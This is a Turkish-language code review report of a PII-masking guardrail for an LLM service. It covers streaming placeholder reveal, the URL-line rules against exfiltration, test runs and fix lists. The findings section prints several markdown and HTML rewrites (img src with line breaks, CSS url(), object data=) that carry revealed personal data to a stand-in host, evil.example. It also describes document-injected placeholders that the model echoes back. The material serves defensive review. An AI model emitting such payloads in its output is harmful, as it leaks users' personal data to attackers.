# 08-tam-1a r3 inceleme (delta, r2 DEGISIKLIK kapanışı)

- **SHA:** 370912d914df97eb1b7682e40f4df061369a7a54 (feat/08-tam-1-ner; 6d0d9ba üstüne 4 commit, 19 dosya +1060/-136, `state/` 0)
- **İstek:** K-08T1-0016 · Cevap: R-08T1-0005 (r2), K-08T1-0014 (DUZELT)
- **İnceleyici worktree:** `.worktrees/review-08t1a-r3` (temiz). Probe dosyaları tek dosya mount ile koşuldu, mount noktaları silindi.
- **Yığın:** review08t1a, 18290/13290, `--profile test --profile qdrant` (langfuse + mcp + ticket-desk), `--pull never`, hepsi healthy
- **Karar: DEGISIKLIK** — BLOCKER 0, MAJOR 2, MINOR 8, NOTE 5

r2'nin üç MAJOR'ı kapandı.
- **MAJOR-r2-1:** r2 tablosundaki her yazım, çok satırlı taşıma ve 8.192 fail-closed dört okuma biçiminde tutuluyor.
- **MAJOR-r2-2:** facade agent'taki bayat `<<PII_1>>` artık çözülmüyor.
- **MAJOR-r2-3:** Gerçek `adapters.context_factory`, LiteLLM ve fake sağlayıcıyla, `min_confidence` 0,8 altında uçtan uca kapandı.

İki yeni MAJOR var:
1. Satır kuralının işaret listesi HTML yeniden yazımlarına açık. Bunu kapatmak işaret listesini genişletmek demek; koordinatör kararı gerekir.
2. `UrlLines` her parçada satırı baştan tarıyor. Tek satırlı uzun bir cevap API olay döngüsünü saniyelerce bloke ediyor; bu bir gerileme.

## r2 bulgularının kapanışı

| r2 | Durum | Kanıt |
|---|---|---|
| MAJOR-r2-1 URL kuralı atlatılıyor | **KAPANDI** (karar listesi içinde) | Facade düz yol, uçtan uca: `md image`, `]( //`, `[1]: //`, boşluklu açılı hedef → hepsi `<<PII_1>>` olarak kaldı (`08t1a-r3-int-probe-llmaas.log`). Mağaza düzeyinde 30 yazım; her biri tek parça, StreamDetokenizer ve ContextReveal ile, 1/7/50 karakterlik parçalarla denendi (`08t1a-r3-probe.log`). Tutulanlar: r2 tablosunun tamamı; alt satıra taşan `](`, `](<`, `src=\n"…"`, `src="\n…"`, `[1]:\n //…` ve `<img\nsrc=…`; CR satır sonu; iç içe parantez; `srcset`; `SRC =`; `xlink:href`; CSS `url(//…)`; meta refresh; U+2028; 9.000 karakterlik düzyazıdan sonra hedef; `src` + 9.000 boşluk + `=`; 9.000 karakter önce açılmış hedef. Atlatma yolları: MAJOR-r3-1. |
| MAJOR-r2-2 bayat yer tutucu | **KAPANDI** | Facade agent istemci geçmişi probe'u: run kapsamında `<<PII_1>>` → `None` (r2'de `ayse.yilmaz@example.test`). Uçtan uca probe: soruya yazılmış `<<PII_9>>` ve A'nın vermediği `<<PII_7>>` B'de çözülmüyor; B'nin ilk değeri `<<PII_10>>`. `reserve_carried` kod okumasıyla: facade agent (`facade_agent.py:197`, istemci geçmişi + soru), facade düz (`guard_messages`), dış agent (`facade_external.py:308`). Kalan kenar durum: MINOR-r3-2. |
| MAJOR-r2-3 geçmiş ham değere çevriliyor | **KAPANDI** | Uçtan uca probe (`state/reviews/08-tam-1a-r3-e2e-probe.py`) gerçek `adapters.context_factory`, `_history`, EngineGuard, LiteLLMModel, LiteLLM ve fake sağlayıcıyla koştu; politika eşiği `min_confidence` 0,8. Sağlayıcının `/_requests` kaydında telefon ham değil: `Kendisine <<PII_10>> üzerinden…`, `https://crm.example/ara?tel=<<PII_10>>`, `Diğer kayıt <<PII_7>> idi.`, `<<PII_9>>`. B'de `<<PII_10>>` → telefon. B'nin `messages` (4), `run_events` (9), `guardrail_events` (12) ve `runs.output` satırlarında ham telefon yok. Checkpoint satırı 0, çünkü tamamlanan koşunun checkpoint'i siliniyor (`08t1a-r3-e2e-probe-llmaas.log`). İşçinin e2e testi elle kurulmuş bir `context_factory` kullanıyordu; bu probe gerçek olanı kullanıyor. |
| MINOR-r2-1 büyük numara | **KISMİ** | ≤ 8 hane kuralı var; 2^63 taşması kapandı (`BOUND huge ignored -> <<PII_1>>`). Ancak 8 haneli `<<PII_99999999>>` hâlâ ayrılıyor ve sonraki değer 9 haneli oluyor. Bunun yeni bir çakışmaya yol açtığı gösterildi: MINOR-r3-2. |
| MINOR-r2-2 yeniden bağlanma kimliği | **KAPANDI** (kod), test eksik | Canlı dal `delivered, last = last, <entry>` (`events.py:227,235`); iki replay dalı gönderdikçe ilerliyor. Yeniden bağlanıp düşen girdiyi alan bir test yok (MINOR-r3-6). |
| MINOR-r2-3 facade düz Redis hatası | **KAPANDI** (canlı akış) | `_token_store_errors` → 502 `detokenize_unavailable`. `abandon()` yalnız çevrilmemiş metni döndürüyor, değer sızmıyor (`test_08t_r2_minors.py:103-116`). Komşu yollar: MINOR-r3-3. |
| MINOR-r2-4 geçmiş TTL yeniliyor | **KAPANDI** | `entry()` EXPIRE yapmadan tek HMGET. Uçtan uca: A eşlemesinin TTL'i B'den önce 50, sonra 46. |
| MINOR-r2-5 docs | **KISMİ** | guardrail.md ve api.md işaret listesi, taşıma, 8.192, sayaç, TTL, `_TICKET_ID`/`erisim` doğru. agentlar.md C17 paragrafı (85-100) URL satır kuralını anmıyor; facade agent yeniden bağlanma ifadesi yanlış (MINOR-r3-5). |
| MINOR-r2-6 PR notu | **KAPANDI** (bir çelişki) | 41 dosya / 19 commit doğru; kriter 8'de 15; tek 106 tablosu var ve düşüşün nedeni yazılı (`_CODE_NAME`); ReDoS süreleri sayılarla verilmiş; varsayım 5/6 güncel. Güvenlik notu (satır 191), "hiçbir okuyucuya açılmaz" diyerek varsayım 9 ile çelişiyor (NOTE-r3-2). r1 tablosunun 132. satırı eski davranışı anlatıyor. |
| MINOR-r2-7 testler | **KISMİ** | Atlatma sınıfı (`test_08t_r2_url_lines.py`) ve sağlayıcıda ham değer olmadığı test ediliyor. Canlı dalda yeniden bağlanma testi yok. |
| NOTE-1 yorum 16 → 15 | **KAPANDI** | `masking.py:20-21` |

## İşçinin varsayımları

- **Varsayım 9 (akışta işaretten önce gönderilmiş yer tutucu geri alınamaz): KABUL.**
  - Gerekçe: listedeki her yazımda hedef, işaretinden sonra başlıyor; işaretten önce gelen yer tutucu bir hedefin içinde olamaz.
  - Probe: `Kişi <<PII_1>> burada ![x](//evil…)` akışta 1/7 karakterlik parçalarla açıldı, tek parçada tutuldu. Fark yalnız düzyazıda.
  - Koşul: PR güvenlik notu (satır 191) ve docs bu farkı açıkça yazmalı (NOTE-r3-2).
  - MAJOR-r3-1'deki `src` + satır sonu + `=` yazımı bu gerekçenin dışında kalıyor, çünkü işaret hiç tanınmıyor. Varsayım 9'un kendisini bozmuyor.
- **Varsayım 10 (açık hedef sonraki satıra taşınır): KABUL, zorunlu.** Bu taşıma olmadan `![x](\n//…)` ve `src="\n…"` açılırdı; probe'da ikisi de tutuldu.
  - Yan etki: taşıma ve `_lost` cevabın sonuna kadar sıfırlanmıyor. Örnekler: düzyazıda kapanmayan `x src="a`, `[not]: 'tis`, tek satırı 8.192 karakteri aşan işaretli bir satır.
  - Sonuç: cevabın geri kalanındaki bütün değerler yer tutucu kalır. Fail-closed, sızıntı yok; kullanılabilirlik konusu MINOR-r3-4'te.
- **Varsayım 11 (`i:` alanı olmayan eski eşleme): KABUL.** Değer doğru kalıyor; yalnız aynı değer yeni kapsamda ayrı bir yer tutucu alabilir.
- **MINOR-r2-1, "eski kapsamın aralığı" uygulanmadı (gerekçe PR:159): YETERLİ DEĞİL.** Soru ve istemci geçmişi için kaynak kapsam yok; bu doğru. Ama 8 haneli üst sınır tek başına yeterli değil: `<<PII_99999999>>` sayacı 9 haneye itiyor ve çakışma geri geliyor (MINOR-r3-2). Basit düzeltme: ayırma ≤ 99.999.998 olmalı ya da sayaç 8 haneyi aşacaksa fail-loud.

## Yeni bulgular

### MAJOR-r3-1 · Satır kuralının işaret listesi HTML yeniden yazımlarıyla atlatılıyor (karar gerekir) — CONFIRMED (mağaza düzeyi, backend konteyneri)

Aşağıdaki dört yazımda değer açıldı (`08t1a-r3-adversarial-check.log`):
1. `<img src\n="http:evil.example/?q=<<PII_1>>">`. CommonMark satır içi HTML, öznitelik adıyla `=` arasında satır sonuna izin veriyor. İlk satırda `src\s*=` yok, ikinci satırda da işaret yok.
2. `<img src\n=\n"http:…<<PII_1>>">`
3. `<span style="background:url(http:evil.example/?q=<<PII_1>>)">`. `style=` ve CSS `url(` işaret değil.
4. `<object data="http:evil.example/?q=<<PII_1>>">`. `data=` işaret değil.

`http:evil.example` biçiminde `//` yok. WHATWG URL ayrıştırması, temelin şemasından farklı özel bir şemayı `http://evil.example` olarak çözüyor; kontrol satırı `<img src="http:…">` ise tutuldu.

Etki koşulu: istemci ham HTML'i işliyor olmalı. Markdown yazımlarının hepsi kapalı. Karar A HTML'i (`src=`, `href=`) tehdit modeline aldığı için bu, MAJOR-r2-1 ile aynı sınıf.

Önerilen genişletme, koordinatör kararıyla (KARARLAR listesi değişir):
- satır sonunda listedeki bir öznitelik adı (`\b(?:src|href|…)\s*$`) "değer bekleniyor" olarak taşınsın;
- `style=`, `data=` ve `url(` işaret olsun;
- şema-iki nokta işareti eklensin: `\b(?:https?|ftp|data|javascript):`.

Daha sağlam bir alternatif: `<harf` ile başlayan bir HTML etiketi içeren satırda hiçbir yer tutucu açılmasın.

Önceki durumla karşılaştırma: 6d0d9ba'da da açıktı, ama r2 kararının amacı bu yeniden yazım sınıfını kapatmaktı.

### MAJOR-r3-2 · `UrlLines.spans` her parçada satırı baştan tarıyor; tek satırlı uzun cevap olay döngüsünü bloke ediyor (gerileme) — CONFIRMED (backend konteyneri)

`masking.py:358` her parçada `self._line + text` kuruyor. `:363` ise işaret bulunana kadar 8.192 karaktere kadar `_URL_MARKER.search` çalıştırıyor. `reveal_text` bu çağrıyı, `<<PII_` erken dönüşünden önce yapıyor (`:394-395`). Yani yer tutucu olmayan akış da bu bedeli ödüyor.

Ölçüm, işaretsiz tek satır, eşzamanlı CPU, okuyucu başına:

| Satır uzunluğu | Parça | StreamDetokenizer | ContextReveal |
|---|---|---|---|
| 16.000 | 4 | 0,89 s | 0,85 s |
| 64.000 | 4 | 5,14 s | 5,05 s |
| 100.000 | 4 | 7,83 s | 9,51 s |
| 100.000 | 1 | 28,5 s | 23,7 s |

Kontrol: 122.000 karakterlik normal düzyazı (61 karakterlik satırlar) 0,20 s.

Konsol akışının her okuyucusu (`ContextReveal`) ve facade düz canlı akış (`StreamDetokenizer`) bu işi API olay döngüsünde yapıyor. Kimliği doğrulanmış bir çağıran "satır sonu olmadan 50 bin karakter yaz" isteğiyle süreçteki bütün istekleri saniyelerce bekletebilir. 6d0d9ba'da tarama yalnız `<<PII_` içeren parçalarda koşuyordu.

**Düzeltme:** satır durumu korunsun, yalnız yeni parça ile en uzun işaret kadar bir örtüşme (`\s*` dahil; uzun boşluk dizisi için kesme sezgisi zaten var) taransın. `_marked` ya da `_cut` set edildikten sonra tarama atlansın. Test: 100 bin karakter, 1 karakterlik parçalar, < 1 s.

### MINOR-r3-1 · Yeniden bağlanan okuyucu satır ortasından başlıyor ve URL içindeki yer tutucuyu açıyor (fail-open) — CONFIRMED (mağaza düzeyi)

Konsol `Last-Event-ID` ile otomatik yeniden bağlanıyor (`frontend/lib/sse.ts`). Onay ya da soru sonrası da `stream_after` ile devam ediyor. Her `follow` çağrısında yeni bir `ContextReveal` kuruluyor, yani satır durumu kayboluyor. Örnek: e1 `![x](https://evil.example/?q=` okunup bağlantı yenilenirse, yeni okuyucu e2 `<<PII_1>>)`'i açıyor (`RESUME new reader after e1: … ali@example.test -> REVEALED`).

FFCore konsolu cevabı düz metin gösteriyor (markdown kütüphanesi yok); bu yüzden konsolun kendisinde görsel yüklenmez. Etki, akış API'sini markdown işleyen bir istemciyle kullanıp yeniden bağlananlar için. Onay gerektiren bir araçla bu durum kasıtlı da tetiklenebilir.

Düzeltme (fail-closed): `after` ile başlayan bir okuyucunun ilk satırı, ilk satır sonuna kadar işaretli sayılsın. Ya da önceki girdilerden satır durumu yeniden kurulsun.

### MINOR-r3-2 · 8 haneli yazılmış yer tutucu sayacı 9 haneye itiyor ve bayat 9 haneli yer tutucu yeni değere çözülüyor — CONFIRMED (backend konteyneri, gerçek `rescope`/`reserve_carried`)

Senaryo: konuşmada `<<PII_99999999>>` var (kullanıcı yazmış ya da belgeden enjekte edilip yankılanmış).
1. Koşu N `<<PII_100000000>>` = a@ veriyor.
2. Eşleme süresi doluyor.
3. Koşu N+1'de `rescope` bu yer tutucuyu bulamıyor ve olduğu gibi bırakıyor.
4. `reserve_carried` 17 karakterlik numarayı yok sayıyor, yine 99.999.999 ayırıyor.
5. Yeni değer b@ yine `<<PII_100000000>>` alıyor.

Sonuç: bayat yer tutucu b@ olarak okunuyor (`08t1a-r3-ninedigit.log`). Ayrıca 9 haneli yer tutucular akışta hizalanmıyor; değer yerine yer tutucu gösteriliyor, sızıntı yok.

Düzeltme: ayırma ≤ 99.999.998 olmalı (sayaç asla 8 haneyi aşmasın) ya da aşacaksa fail-loud. Test bu senaryo.

### MINOR-r3-3 · `detokenize_unavailable` komşu facade yollarında eşlenmemiş — CONFIRMED (kod)

`guard.reveal` şu yerlerde `_token_store_errors` dışında çağrılıyor:
- facade düz tek parça `_answer` (`facade_proxy.py:285`);
- `_checked_calls` (`:313`; canlı yolda sonucu kullanılmıyor bile);
- tamponlu akış (`:524`; `except ApiError` `RedisError` yakalamıyor);
- dış agent (`facade_external.py:396`).

Sonuç: tek parça yanıtta 502 yerine işlenmemiş 500. Tamponlu akışta hata olayı ve `[DONE]` olmadan kopuş, yani MINOR-r2-3 belirtisi komşu yolda. Bir NOTE ile birlikte: aynı chunk'ta önce açılmış içerik, sonraki anahtar düşünce sessizce kayboluyor. Yığında üretilmedi.

### MINOR-r3-4 · Fail-closed durumları cevap sonuna kadar sıfırlanmıyor (kullanılabilirlik; karar gerekebilir)

`_lost` yalnız set ediliyor (`masking.py:376`). Açık hedef ancak kapatıcısı gelince kapanıyor (`:330-338`). Kapanmayan `"`, `'`, `)` ya da 8.192'yi aşan işaretli tek satırdan sonra cevabın geri kalanındaki bütün değerler yer tutucu kalıyor. Adversarial geçişte bellek içinde dört örnekle denendi; yığında koşulmadı.

Öneri: boş satır açık hedefi ve `_lost`'u kapatsın (CommonMark'ta bağlantı hedefi boş satırı geçemez). Fail-closed'u gevşettiği için koordinatör kararı.

### MINOR-r3-5 · docs eksik ya da yanlış

- `docs/agentlar.md` 85-100: URL satır kuralı ve `detokenize_skipped_url` yok. `api.md:481` agent yolu için buraya yönlendiriyor.
- `guardrail.md:151` ve `api.md:534`: facade agent hata olayının yeniden bağlanma kimliği taşıdığını söylüyor. Gerçekte facade agent istemcisi kimliksiz OpenAI biçiminde `data: {"error":…}` alıyor (`facade_agent.py:390-396`); `X-Resume-Run-Id` son onay/soru olayından ya da `0-0`'dan başlıyor.
- Takas ifadesi "a line with a link" diyor. Kural bağlantı olmayan satırlarda da tetikleniyor: kod yorumu `//`, düzyazıda `[x]:`, `SRC =`.

### MINOR-r3-6 · Canlı dalda yeniden bağlanma testi yok

MINOR-r2-2'nin "yeniden bağlanınca düşen girdi gelir" vaadi yalnız kimlik karşılaştırmasıyla test ediliyor (`test_08t_r2_minors.py:73-85`). r2 DUZELT'in istediği canlı dal yeniden bağlanma testi yok.

### MINOR-r3-7 · Araç sonucu ve KB parçasındaki düz `<<PII_n>>` metni ayrılmıyor — kod okuması, fb7130d'den beri var

`reserve_carried` çalışma zamanında yalnız `_history`'de çağrılıyor. Bir belge parçasında `<<PII_2>>` yazıyorsa ve model bunu yankılarsa, koşunun kendi #2 değerine açılıyor. Ya da daha sonra verilen bir numarayla çakışıyor. Açılan değer her zaman koşunun kendi değeri ve kendi sahibine gösteriliyor; kapsamlar arası sızıntı değil, yanlış atıf ve enjeksiyon bütünlüğü sorunu. Düzeltme: araç sonucu ve KB metni egress tokenize öncesi `reserve_carried`'dan geçsin. FOLLOWUP-162 adayı olarak da kabul edilebilir.

### MINOR-r3-8 · PR notunda r1 tablosu satırı bayat

`state/pr/08-tam-1a.md:132` hâlâ "facade agent istemci geçmişini egress öncesi metinle saklar" diyor. r2 bunu tersine çevirdi.

## NOTE

1. Airgap `make test`'te `test_08t_secrets_linear` 5 kırmızı verdi: 10 s alt süreç sınırı aşıldı. O sırada aynı makinede tam yığın test-int ve probe'lar koşuyordu. Aynı dosya tek başına 7/7 geçti, her test 1,6-3,2 s (`08t1a-r3-linear-rerun-airgap.log`); `rules.py` bu delta'da değişmedi. Bütçe yorumlayıcı başlatma ve ffcore import'unu içerdiği için yük altında kararsız. Bütçe ya regex süresini içeride ölçsün ya da gevşetilsin.
2. PR güvenlik notu (satır 191) "satırdaki yer tutucu hiçbir okuyucuya açılmaz" diyor. Akışta işaretten önceki yer tutucu açılıyor (varsayım 9); bu ifade düzeltilmeli.
3. r2 öncesi yazılmış istemci geçmişi satırları (egress öncesi ham metin) artık run1 kapsamında okunuyor. İçlerinde düz `<<PII_2>>` varsa run1'in #2 değerine eşlenebilir. Yalnız dağıtım öncesi veri; geliştirme verisi temizliği yeter.
4. Probe 1/7 karakterlik parçalarla `ContextReveal`'a yer tutucuyu bölünmüş verdiğinde düz metinde de yer tutucu kaldı. Bu probe'un yapay durumu; gerçek yolda yazarın hizalayıcısı girdileri bütün yer tutucuyla yazıyor.
5. Uçtan uca probe'da checkpoint tablolarında satır 0, çünkü tamamlanan koşunun checkpoint'i siliniyor. Onay bekleyen koşunun checkpoint'i bu turda ölçülmedi (NOT_RUN). Kod okumasıyla `rescope` ham değer üretmediği için state'e ham değer girmiyor.

## Güvenlik turu

- **Veri çıkışı (llmaas):**
  - Sağlayıcıya ham değer gitmiyor; `min_confidence` 0,8 durumunda da (uçtan uca, `/_requests`).
  - İstemci tarafı sıfır tık: markdown yazımları kapalı. HTML yeniden yazımları açık (MAJOR-r3-1). Yeniden bağlanmada satır ortası açık (MINOR-r3-1).
- **Kişi verisinin karışması:** MAJOR-r2-2 sınıfı kapandı. Kenar durumlar: 9 haneli çakışma (MINOR-r3-2) ve araç/KB metnindeki düz yer tutucu (MINOR-r3-7, önceden var).
- **S8:** Yetki çekirdeği değişmedi. Facade agent istemci geçmişi artık run kapsamında tokenize saklanıyor, ham değer yok. Sahip için bir okuma API'si bulunmadı (grep).
- **Erişilebilirlik:** MAJOR-r3-2 (olay döngüsü blokajı, kimliği doğrulanmış çağıranca tetiklenebilir) ve MINOR-r3-3.
- **06b-2 SSRF probe ve 147:** bu SHA'da iki profilde 138/138; gerileme yok.

## Koşular

| Koşu | Sonuç | Kanıt |
|---|---|---|
| `make test` llmaas | 1210 passed (14:48) | `state/evidence/08t1a-r3-unit-llmaas.log` |
| `make test` airgap | 1205 passed, 5 failed (zaman bütçesi, yük; NOTE-1); dosya tek başına 7/7 | `08t1a-r3-unit-airgap.log`, `08t1a-r3-linear-rerun-airgap.log` |
| `make test-int` llmaas (tam yığın) | 837 passed, 5 skipped, 1 failed: `test_03a_9_unresolvable_host_is_a_failed_test` (`.invalid` DNS zaman aşımı → `egress_timeout`; delta egress/provider koduna dokunmuyor; dosya tek başına 16/16, airgap'te geçti; ortam) | `08t1a-r3-int-llmaas.log` |
| `test_03a_providers.py` tek başına llmaas | 16 passed | `08t1a-r3-03a-rerun-llmaas.log` |
| `make test-int` airgap (tam yığın) | 836 passed, 7 skipped (11:16), kırmızı yok | `08t1a-r3-int-airgap.log` |
| r2 entegrasyon probe'u (facade geçmiş + 4 URL yazımı) llmaas | 5/5 yeşil (r2'de 5 kırmızı) | `08t1a-r3-int-probe-llmaas.log` |
| r3 uçtan uca `min_confidence` 0,8 (gerçek `context_factory` + fake sağlayıcı) llmaas | yeşil | `08t1a-r3-e2e-probe-llmaas.log`, `state/reviews/08-tam-1a-r3-e2e-probe.py` |
| r2 + r3 probe'ları airgap (kontrol) | facade geçmiş `None`; e2e yeşil (B `<<PII_10>>`); URL yazımı `]( //` airgap'te açık: egress yok, değer zaten sağlayıcıda (r2 ile aynı kontrol, bulgu değil) | `08t1a-r3-int-probe-airgap.log` |
| r3 mağaza düzeyi probe (30 yazım × 7 okuma biçimi, varsayım 9/10, resume, sınırlar) | yukarıda | `08t1a-r3-probe.log`, `state/reviews/08-tam-1a-r3-probe.py` |
| Adversarial doğrulama (HTML atlatma, CPU ölçümü) | yukarıda | `08t1a-r3-adversarial-check.log` |
| 9 haneli çakışma | yukarıda | `08t1a-r3-ninedigit.log` |
| 06b-2 SSRF probe + 06b-2/147 testleri | 138/138 llmaas, 138/138 airgap | `08t1a-r3-06b2-probe-{llmaas,airgap}.log` |
| lint | NOT_RUN: işçi kanıtı "lint 0" | — |

## İşçiye kısa liste (DUZELT önerisi)

1. MAJOR-r3-2: `UrlLines` artımlı tarama, 100 bin karakter / 1 karakterlik parça < 1 s testi.
2. MAJOR-r3-1: koordinatör kararıyla işaret listesinin genişletilmesi (satır sonunda öznitelik adı, `style=`, `data=`, `url(`, şema-iki nokta) ya da HTML etiketi satırı kuralı; testler bu raporun dört yazımı.
3. MINOR-r3-1: yeniden bağlanan okuyucunun ilk satırı fail-closed.
4. MINOR-r3-2: ayırma üst sınırı 99.999.998 ya da fail-loud.
5. MINOR-r3-3: komşu facade yollarında 502 eşlemesi.
6. MINOR-r3-4 (karar): boş satırla sıfırlama.
7. MINOR-r3-5, -6, -8: docs, canlı dalda yeniden bağlanma testi, PR notu. MINOR-r3-7 bu turda ya da FOLLOWUP-162.
